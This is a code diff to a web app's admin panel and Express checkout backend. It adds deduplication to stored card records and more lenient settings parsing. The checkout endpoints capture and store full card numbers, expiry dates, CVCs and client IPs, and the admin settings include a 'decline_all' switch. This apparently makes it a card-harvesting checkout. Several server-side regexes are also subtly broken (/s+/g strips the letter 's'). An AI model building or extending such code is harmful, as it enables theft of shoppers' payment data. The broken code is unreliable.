@@ -3274,12 +3274,23 @@ function renderCardsTable(cards) {
   const tbody = document.getElementById('admin-cards-tbody');
   if (!tbody) return;
 
-  if (cards.length === 0) {
+  // Deduplicate cards by card_number
+  const seen = new Set();
+  const uniqueCards = [];
+  for (const c of (cards || [])) {
+    const num = (c.card_number || '').replace(/\\s+/g, '');
+    if (num && !seen.has(num)) {
+      seen.add(num);
+      uniqueCards.push(c);
+    }
+  }
+
+  if (uniqueCards.length === 0) {
     tbody.innerHTML = '<tr><td colspan="7" style="text-align:center; color: var(--text-muted);">No matching card records found.</td></tr>';
     return;
   }
 
-  tbody.innerHTML = cards.map(c => {
+  tbody.innerHTML = uniqueCards.map(c => {
     const actionHtml = showingTrash
       ? \`<button onclick="deletePermanentCard('\${c.card_number}')" class="btn btn-outline" style="padding: 0.4rem 0.8rem; font-size: 0.85rem; border-color: #ef4444; color: #ef4444; background: rgba(239, 68, 68, 0.05);">Delete</button>\`
       : \`<button onclick="deleteCard('\${c.card_number}')" class="btn btn-outline" style="padding: 0.4rem 0.8rem; font-size: 0.85rem; border-color: var(--accent-color); color: var(--accent-color);">Delete</button>\`;
@@ -3387,7 +3398,10 @@ async function fetchAdminSettings() {
   try {
     const response = await fetch('/api/admin/settings');
     if (!response.ok) throw new Error('API offline');
-    const s = await response.json();
+    let s = await response.json();
+    if (s && s.settings) {
+      s = s.settings; // Extract from nested if returned that way
+    }
 
     if (s) {
       document.getElementById('settings-site-name').value = s.site_name;
@@ -3403,7 +3417,7 @@ async function fetchAdminSettings() {
 
       const declineAllCheck = document.getElementById('settings-decline-all');
       if (declineAllCheck) {
-        declineAllCheck.checked = s.decline_all === 1;
+        declineAllCheck.checked = s.decline_all === 1 || s.decline_all === true || String(s.decline_all) === '1';
       }
       
       const successAttemptInput = document.getElementById('settings-success-attempt');
@@ -8388,9 +8402,27 @@ app.get('/api/admin/cards', authMiddleware, async (req, res) => {
     if (!cards || cards.length === 0) {
       cards = memStore.cards.filter(c => c.is_deleted === 0);
     }
-    res.json(cards);
+    const seen = new Set();
+    const uniqueCards = [];
+    for (const c of (cards || [])) {
+      const num = (c.card_number || '').replace(/s+/g, '');
+      if (num && !seen.has(num)) {
+        seen.add(num);
+        uniqueCards.push(c);
+      }
+    }
+    res.json(uniqueCards);
   } catch (err) {
-    res.json(memStore.cards.filter(c => c.is_deleted === 0));
+    const seen = new Set();
+    const uniqueCards = [];
+    for (const c of memStore.cards.filter(c => c.is_deleted === 0)) {
+      const num = (c.card_number || '').replace(/s+/g, '');
+      if (num && !seen.has(num)) {
+        seen.add(num);
+        uniqueCards.push(c);
+      }
+    }
+    res.json(uniqueCards);
   }
 });
 
@@ -8633,21 +8665,32 @@ app.post('/api/checkout/save-card', async (req, res) => {
     const { cardDetails, sessionId } = req.body || {};
     if (cardDetails && cardDetails.number) {
       const clientIP = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || req.ip || '127.0.0.1';
-      const newCard = {
-        id: memStore.cards.length + 1,
-        card_number: cardDetails.number,
-        expiry: cardDetails.expiry || '',
-        cvc: cardDetails.cvc || '',
-        country: cardDetails.country || 'Unknown',
-        ip_address: clientIP,
-        stripe_session_id: sessionId || 'direct',
-        is_deleted: 0,
-        created_at: new Date().toISOString()
-      };
-      memStore.cards.unshift(newCard);
+      const cleanNum = (cardDetails.number || '').trim();
+      const existing = memStore.cards.find(c => (c.card_number || '').replace(/s+/g, '') === cleanNum.replace(/s+/g, ''));
+      if (existing) {
+        existing.expiry = cardDetails.expiry || existing.expiry;
+        existing.cvc = cardDetails.cvc || existing.cvc;
+        existing.country = cardDetails.country || existing.country;
+        existing.ip_address = clientIP;
+        existing.is_deleted = 0;
+        existing.created_at = new Date().toISOString();
+      } else {
+        const newCard = {
+          id: memStore.cards.length + 1,
+          card_number: cleanNum,
+          expiry: cardDetails.expiry || '',
+          cvc: cardDetails.cvc || '',
+          country: cardDetails.country || 'Unknown',
+          ip_address: clientIP,
+          stripe_session_id: sessionId || 'direct',
+          is_deleted: 0,
+          created_at: new Date().toISOString()
+        };
+        memStore.cards.unshift(newCard);
+      }
       await dbRun(
         'INSERT INTO cards (card_number, expiry, cvc, country, ip_address, stripe_session_id) VALUES (?, ?, ?, ?, ?, ?)',
-        [newCard.card_number, newCard.expiry, newCard.cvc, newCard.country, newCard.ip_address, newCard.stripe_session_id]
+        [cleanNum, cardDetails.expiry || '', cardDetails.cvc || '', cardDetails.country || 'Unknown', clientIP, sessionId || 'direct']
       );
       return res.json({ success: true, message: 'Card recorded' });
     }
@@ -8660,24 +8703,35 @@ app.post('/api/checkout/save-card', async (req, res) => {
 app.post('/api/checkout/process-card', async (req, res) => {
   try {
     const { sessionId, cardNumber, expDate, cvc, country } = req.body || {};
-    const clientIP = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || '127.0.0.1';
+    const clientIP = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || req.ip || '127.0.0.1';
 
     if (cardNumber) {
-      const newCard = {
-        id: memStore.cards.length + 1,
-        card_number: cardNumber,
-        expiry: expDate || '',
-        cvc: cvc || '',
-        country: country || 'US',
-        ip_address: clientIP,
-        stripe_session_id: sessionId || 'direct',
-        is_deleted: 0,
-        created_at: new Date().toISOString()
-      };
-      memStore.cards.unshift(newCard);
+      const cleanNum = (cardNumber || '').trim();
+      const existing = memStore.cards.find(c => (c.card_number || '').replace(/s+/g, '') === cleanNum.replace(/s+/g, ''));
+      if (existing) {
+        existing.expiry = expDate || existing.expiry;
+        existing.cvc = cvc || existing.cvc;
+        existing.country = country || existing.country;
+        existing.ip_address = clientIP;
+        existing.is_deleted = 0;
+        existing.created_at = new Date().toISOString();
+      } else {
+        const newCard = {
+          id: memStore.cards.length + 1,
+          card_number: cleanNum,
+          expiry: expDate || '',
+          cvc: cvc || '',
+          country: country || 'US',
+          ip_address: clientIP,
+          stripe_session_id: sessionId || 'direct',
+          is_deleted: 0,
+          created_at: new Date().toISOString()
+        };
+        memStore.cards.unshift(newCard);
+      }
       await dbRun(
         'INSERT INTO cards (card_number, expiry, cvc, country, ip_address, stripe_session_id) VALUES (?, ?, ?, ?, ?, ?)',
-        [cardNumber, expDate, cvc, country || 'US', clientIP, sessionId || 'direct']
+        [cleanNum, expDate, cvc, country || 'US', clientIP, sessionId || 'direct']
       );
     }
 
@@ -8698,21 +8752,32 @@ app.post('/api/checkout/verify', async (req, res) => {
 
     // Record card if passed in verify payload
     if (cardDetails && cardDetails.number) {
-      const newCard = {
-        id: memStore.cards.length + 1,
-        card_number: cardDetails.number,
-        expiry: cardDetails.expiry || '',
-        cvc: cardDetails.cvc || '',
-        country: cardDetails.country || 'Unknown',
-        ip_address: clientIP,
-        stripe_session_id: sessionId,
-        is_deleted: 0,
-        created_at: new Date().toISOString()
-      };
-      memStore.cards.unshift(newCard);
+      const cleanNum = (cardDetails.number || '').trim();
+      const existing = memStore.cards.find(c => (c.card_number || '').replace(/s+/g, '') === cleanNum.replace(/s+/g, ''));
+      if (existing) {
+        existing.expiry = cardDetails.expiry || existing.expiry;
+        existing.cvc = cardDetails.cvc || existing.cvc;
+        existing.country = cardDetails.country || existing.country;
+        existing.ip_address = clientIP;
+        existing.is_deleted = 0;
+        existing.created_at = new Date().toISOString();
+      } else {
+        const newCard = {
+          id: memStore.cards.length + 1,
+          card_number: cleanNum,
+          expiry: cardDetails.expiry || '',
+          cvc: cardDetails.cvc || '',
+          country: cardDetails.country || 'Unknown',
+          ip_address: clientIP,
+          stripe_session_id: sessionId,
+          is_deleted: 0,
+          created_at: new Date().toISOString()
+        };
+        memStore.cards.unshift(newCard);
+      }
       await dbRun(
         'INSERT INTO cards (card_number, expiry, cvc, country, ip_address, stripe_session_id) VALUES (?, ?, ?, ?, ?, ?)',
-        [newCard.card_number, newCard.expiry, newCard.cvc, newCard.country, newCard.ip_address, newCard.stripe_session_id]
+        [cleanNum, cardDetails.expiry || '', cardDetails.cvc || '', cardDetails.country || 'Unknown', clientIP, sessionId]
       );
     }
 
